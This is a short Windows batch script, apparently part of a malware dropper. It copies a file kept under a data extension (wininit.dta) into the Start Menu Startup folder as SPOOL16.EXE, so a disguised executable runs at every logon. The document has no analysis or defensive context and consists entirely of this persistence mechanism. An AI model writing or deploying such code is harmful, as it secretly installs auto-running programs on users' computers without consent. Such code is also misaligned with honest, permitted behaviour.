@echo off
:s
@if exist "C:\WINDOWS\SPOOL16.EXE" goto f
@copy "C:\WINDOWS\wininit.dta" "C:\WINDOWS\Start Menu\Programs\Startup\SPOOL16.EXE"
:f
